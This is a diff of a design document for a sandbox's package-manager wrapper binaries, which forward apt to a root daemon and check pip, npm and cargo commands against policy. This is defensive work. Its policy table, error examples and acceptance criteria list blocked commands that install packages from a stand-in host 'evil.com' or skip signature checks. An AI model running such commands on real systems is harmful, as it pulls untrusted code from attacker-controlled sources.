@@ -2,128 +2,152 @@
 
 **Epic:** 7 — Runtime Interception Layer
 **Status:** Planning
-**Dependencies:** US-7.1 (System Daemon)
+**Dependencies:** US-7.1 (System Daemon — for apt wrapper)
 
 ## Objective
 
-Build compiled Go wrapper binaries that replace package manager binaries at their canonical paths. Wrappers forward install requests to the system daemon via Unix socket. Real binaries are relocated to a hidden directory.
+Build compiled Go wrapper binaries that replace package manager binaries at their canonical paths. Two categories:
+
+1. **System package managers** (apt) → forward to daemon for root execution
+2. **Language package managers** (pip, npm, cargo) → enforce policy inline (no root needed)
 
 ## Design
 
-### Binary Relocation
-
-During image build (Dockerfile):
+### Binary Relocation (at image build time)
 
 ```dockerfile
-RUN mv /usr/bin/apt /opt/llmsafespace/.bin/apt && \
-    mv /usr/bin/pip3 /opt/llmsafespace/.bin/pip3 && \
-    mv /usr/local/bin/npm /opt/llmsafespace/.bin/npm
-# Install wrappers at original paths
-COPY --chmod=555 wrapper /usr/bin/apt
-COPY --chmod=555 wrapper /usr/bin/pip3
-COPY --chmod=555 wrapper /usr/local/bin/npm
-# Make wrappers immutable
-RUN chattr +i /usr/bin/apt /usr/bin/pip3 /usr/local/bin/npm
+RUN mkdir -p /opt/llmsafespace/.bin && \
+    mv /usr/bin/apt /opt/llmsafespace/.bin/apt && \
+    mv /usr/bin/apt-get /opt/llmsafespace/.bin/apt-get && \
+    chown -R root:root /opt/llmsafespace/.bin && \
+    chmod 750 /opt/llmsafespace/.bin
+
+# Wrapper installed at original paths
+COPY --chmod=755 wrapper /usr/bin/apt
+COPY --chmod=755 wrapper /usr/bin/apt-get
 ```
 
-`/opt/llmsafespace/.bin/` is:
-- Not in any PATH
-- Owned by root, permissions `0750 root:root`
-- Not directly executable by sandbox user
+`/opt/llmsafespace/.bin/` is root:root 750 — UID 1000 cannot read or execute directly.
 
-### Single Binary, Multi-Call
+### Single Multi-Call Binary
 
-One compiled Go binary, behavior determined by `argv[0]` (like BusyBox):
+One compiled Go binary, behavior determined by `argv[0]` (BusyBox pattern):
 
 ```go
 func main() {
-    name := filepath.Base(os.Args[0]) // "apt", "pip3", "npm", etc.
-    
-    conn, err := net.Dial("unix", "/run/llmsafespace/system.sock")
-    // ... send Request{Command: name, Args: os.Args[1:]}
-    // ... stream stdout/stderr to os.Stdout/os.Stderr
-    // ... exit with response exit code
+    name := filepath.Base(os.Args[0])
+    switch {
+    case isSystemPkgMgr(name):   // apt, apt-get, apk
+        handleSystemInstall(name)
+    case isLangPkgMgr(name):     // pip, pip3, npm, cargo
+        handleLangPkgMgr(name)
+    default:                     // python3, node, go
+        handleLanguageRuntime(name)  // US-7.3
+    }
 }
 ```
 
-Symlinks or hardlinks at each path all point to the same binary. The binary:
-1. Connects to the daemon socket
-2. Sends the command name + args
-3. Streams output back to the caller's stdout/stderr
-4. Exits with the daemon-reported exit code
+Hard links at each path point to the same binary.
+
+### System Package Managers (apt → daemon)
+
+```go
+func handleSystemInstall(name string) {
+    conn, err := net.Dial("unix", "/run/llmsafespace/system.sock")
+    if err != nil {
+        fmt.Fprintf(os.Stderr, "[llmsafespace] Cannot connect to system daemon: %v\n", err)
+        os.Exit(1)
+    }
+    // Send request, stream response to stdout/stderr, exit with daemon's exit code
+}
+```
+
+All apt invocations go through the daemon regardless of subcommand. The daemon decides what's allowed.
+
+### Language Package Managers (pip/npm/cargo — policy only)
+
+These don't need root. They install to user-writable paths:
+- `pip install` → `/home/sandbox/.local/` or `--target /workspace/...`
+- `npm install` → `./node_modules/` or `-g` to `/home/sandbox/.npm-global/`
+- `cargo install` → `/home/sandbox/.cargo/bin/`
+
+The wrapper enforces policy (blocked packages, blocked sources, blocked flags) then exec's the real binary:
+
+```go
+func handleLangPkgMgr(name string) {
+    policy := loadPolicy(name)  // /etc/llmsafespace/policies/<name>.json
+    if policy == nil || !policy.Enabled {
+        execReal(name)  // passthrough
+        return
+    }
+    
+    if violation := checkPolicy(policy, os.Args[1:]); violation != "" {
+        fmt.Fprintf(os.Stderr, "[llmsafespace] Blocked: %s\n", violation)
+        fmt.Fprintf(os.Stderr, "[llmsafespace] Policy: /etc/llmsafespace/policies/%s.json\n", name)
+        os.Exit(1)
+    }
+    
+    execReal(name)  // policy passed, exec real binary
+}
+```
+
+### Policy Checks for Language Package Managers
+
+| Check | Example |
+|-------|---------|
+| Blocked packages | `pip install malicious-pkg` → denied |
+| Blocked flags | `pip install --trusted-host evil.com pkg` → denied |
+| Source restrictions | `npm install --registry https://evil.com pkg` → denied |
 
 ### Error UX
 
-When the daemon rejects a request:
-
 ```
-$ apt install --allow-unauthenticated sketchy-pkg
+$ apt install python3
+Reading package lists... Done
+Setting up python3 ...
+Done.
+
+$ pip install --trusted-host evil.com sketchy
+[llmsafespace] Blocked: flag '--trusted-host' is not permitted by policy.
+[llmsafespace] Policy: /etc/llmsafespace/policies/pip.json
+
+$ apt install --allow-unauthenticated bad-pkg
 [llmsafespace] Blocked: flag '--allow-unauthenticated' is not permitted.
 [llmsafespace] Policy: /etc/llmsafespace/daemon/policy.json
-[llmsafespace] To request an exception, contact your workspace administrator.
 ```
 
-When the daemon is unreachable:
+### What About `npm install -g`?
 
-```
-$ pip install requests
-[llmsafespace] Error: cannot connect to system daemon at /run/llmsafespace/system.sock
-[llmsafespace] The system daemon may not be running. Contact your administrator.
-```
-
-### Covered Package Managers
-
-| Binary | Original Path | Notes |
-|--------|--------------|-------|
-| `apt` | `/usr/bin/apt` | Also `apt-get` (symlink to same wrapper) |
-| `pip` / `pip3` | `/usr/bin/pip3` | Also handles `pip` symlink |
-| `npm` | `/usr/local/bin/npm` | |
-| `cargo` | `/usr/local/bin/cargo` | If Rust is installed |
-| `go install` | Handled by language wrapper (US-7.3) | `go install` needs root for global; `go build` does not |
-
-### What Passes Through vs. What Goes to Daemon
-
-Not all invocations need root. The wrapper checks:
-- `pip install` → daemon (needs root for system packages)
-- `pip list` → direct exec of real binary (read-only, no root needed)
-- `apt install` → daemon
-- `apt list` → direct exec
-- `npm install -g` → daemon (global install needs root)
-- `npm install` (local) → direct exec (writes to cwd, no root needed)
+Global npm installs write to a root-owned path by default. The wrapper reconfigures npm's global prefix to a user-writable location:
 
 ```go
-func needsPrivilege(command string, args []string) bool {
-    switch command {
-    case "apt", "apt-get":
-        return containsAny(args, "install", "update", "upgrade", "remove")
-    case "pip", "pip3":
-        return containsAny(args, "install", "uninstall")
-    case "npm":
-        return contains(args, "-g") || contains(args, "--global")
-    }
-    return false
+// For npm with -g/--global, set prefix to user-writable path
+if name == "npm" && hasGlobalFlag(os.Args) {
+    os.Setenv("NPM_CONFIG_PREFIX", "/home/sandbox/.npm-global")
 }
 ```
 
-If no privilege needed, the wrapper exec's the real binary directly (no socket round-trip).
+This avoids needing root for global npm installs. The PATH in the container includes `/home/sandbox/.npm-global/bin`.
 
 ## Files Created
 
 | File | Purpose |
 |------|---------|
-| `cmd/wrapper/main.go` | Multi-call binary: detect argv[0], route to daemon or direct exec |
-| `cmd/wrapper/client.go` | Unix socket client: connect, send request, stream response |
-| `cmd/wrapper/privilege.go` | `needsPrivilege()` logic per package manager |
+| `cmd/wrapper/main.go` | Multi-call dispatch: detect argv[0], route to appropriate handler |
+| `cmd/wrapper/system.go` | System package manager handler (apt → daemon socket client) |
+| `cmd/wrapper/langpkg.go` | Language package manager handler (pip/npm/cargo → policy check → exec) |
+| `cmd/wrapper/policy.go` | Policy loading and checking (shared with US-7.3) |
+| `cmd/wrapper/exec.go` | Helper: exec real binary from /opt/llmsafespace/.bin/ |
 
 ## Acceptance Criteria
 
 1. `apt install python3` succeeds (forwarded to daemon, installed as root)
-2. `apt list --installed` succeeds without daemon (direct exec)
-3. `pip install requests` succeeds (forwarded to daemon)
-4. `pip list` succeeds without daemon (direct exec)
-5. `npm install -g typescript` succeeds (forwarded to daemon)
-6. `npm install express` (local) succeeds without daemon (direct exec)
-7. Wrapper binary is <5MB static binary
-8. Wrapper adds <1ms latency for direct-exec path
-9. Wrapper is immutable (`lsattr` shows `i` flag)
-10. Real binaries are not accessible to sandbox user directly
+2. `apt list --installed` succeeds (forwarded to daemon, read-only operation)
+3. `pip install requests` succeeds (direct exec, no daemon)
+4. `pip install --trusted-host evil.com pkg` blocked by policy
+5. `npm install express` succeeds (local install, no daemon)
+6. `npm install -g typescript` succeeds (redirected to user-writable prefix)
+7. Wrapper binary is <5MB static
+8. Wrapper adds <1ms latency for direct-exec path (measured)
+9. Real binaries not accessible to UID 1000 (`ls /opt/llmsafespace/.bin/` → permission denied)
+10. With no policy file, all package managers pass through
